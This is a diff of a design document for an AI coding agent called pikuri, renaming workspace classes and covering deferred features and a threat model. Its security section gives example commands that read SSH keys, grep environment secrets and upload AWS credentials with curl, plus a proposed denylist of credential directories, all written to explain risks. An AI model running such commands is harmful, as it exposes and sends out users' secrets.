@@ -16,14 +16,14 @@ in scope of the design exercise, considered, and left out on purpose.
 
 - **Permission system.** opencode's three-action `allow` / `deny` /
   `ask` glob rules. v1 ships with two coarse modes (interactive
-  `Tool::Confirmer::TERMINAL` on `Write` / `Bash`; `--yolo` swaps in
+  `Workspace::Confirmer::TERMINAL` on `Write` / `Bash`; `--yolo` swaps in
   `AUTO_APPROVE`). Revisit once `bin/pikuri-code` has lived a while
   and we know where the friction is. Where things are headed:
   yolo-in-docker, or ClaudeCode's agentic review of the command + automatic approval/denial.
-- **Image / PDF in `Tool::Read`.** Read refuses binaries today
-  (`lib/pikuri/tool/read.rb` rejects on a null-byte heuristic). Multimodal
-  Read needs vision-capable models and the streaming/encoding path
-  ruby_llm exposes but we haven't wired.
+- **Image / PDF in `Workspace::Read`.** Read refuses binaries today
+  (`lib/pikuri/workspace/read.rb` rejects on a null-byte heuristic).
+  Multimodal Read needs vision-capable models and the streaming/encoding
+  path ruby_llm exposes but we haven't wired.
 - **LSP tool.** opencode wires an LSP client for hover / definition /
   diagnostics. Big-ticket feature; deferred until there's a concrete
   use case beyond "opencode has one."
@@ -39,20 +39,20 @@ in scope of the design exercise, considered, and left out on purpose.
   tool persists sub-sessions; `Tool::SubAgent` doesn't. Worth doing
   the day we have any other reason to introduce a session store
   (todo/plan tools being the obvious second customer).
-- **Multi-file / multi-hunk Edit.** `Tool::Edit` takes one
+- **Multi-file / multi-hunk Edit.** `Workspace::Edit` takes one
   `old_string` → `new_string` per call. opencode bundles batch edits.
   Wait until the cost of separate calls becomes obvious in practice.
 
 ## Workspace v2
 
-Plans recorded in `lib/pikuri/tool/workspace.rb`'s "Future extensions" RDoc
-section, summarised here so they show up in a doc-only sweep:
+Plans recorded in `lib/pikuri/workspace/filesystem.rb`'s "Future extensions"
+RDoc section, summarised here so they show up in a doc-only sweep:
 
 - **Multi-root workspace.** A read-set wider than the write-set —
   e.g. `~/.claude/skills` readable, project CWD writable. The
-  `Workspace` abstract base already splits `resolve_for_read` /
+  `Filesystem` class splits `resolve_for_read` /
   `resolve_for_write` to make this seamless.
-- **`Tool::Workspace::ALLOW_ALL`.** Unrestricted reads + writes,
+- **`Workspace::Filesystem::ALLOW_ALL`.** Unrestricted reads + writes,
   intended for Docker / dev-container mode where the whole sandbox is
   the workspace. Pairs naturally with `--yolo`.
 - Support for sandboxed bash (via bubblewrap)? Not bad, but what
@@ -126,7 +126,7 @@ hatches if true nesting is unavoidable.
 
 ### Bash escapes the workspace seam
 
-`Workspace` constrains `Read` / `Write` / `Edit` / `Grep` /
+`Workspace::Filesystem` constrains `Read` / `Write` / `Edit` / `Grep` /
 `Glob`. **It does not constrain `Bash`.** `cat ~/.ssh/id_rsa`,
 `env | grep -i key`, `curl --upload-file ~/.aws/credentials ...` all
 run as the user. The Confirmer is the only thing between yolo-off mode
@@ -221,7 +221,7 @@ cloned by the user. Same defense as the lethal-trifecta point.
 - **`URLCache` on disk.** Cached pages with embedded auth cookies or
   sensitive scrape results — disk encryption matters, backups matter.
 - **TOCTOU.** Mostly theoretical for an interactive agent, but
-  `Workspace`'s check-then-open isn't atomic on POSIX.
+  `Workspace::Filesystem`'s check-then-open isn't atomic on POSIX.
 - **Sub-agent context leak.** A child given less context than the
   parent can still leak parent context that flows in via the parent's
   "task" prompt.
@@ -324,7 +324,7 @@ warnings.
 - **opencode's `(permission-name, glob-pattern)` ruleset shape** if
   `Confirmer` ever expands beyond binary approve/deny.
 - **PI's credential-dir deny-read defaults** (`~/.ssh`, `~/.aws`,
-  `~/.gnupg`) — a `Workspace` default denylist gives some real
+  `~/.gnupg`) — a `Workspace::Filesystem` default denylist gives some real
   protection even without a sandbox, and it's a one-method change.
   Same for deny-write on `.env*` / `*.pem` / `*.key`.
 - **Gondolin's secret-placeholder pattern.** A tool surface where env
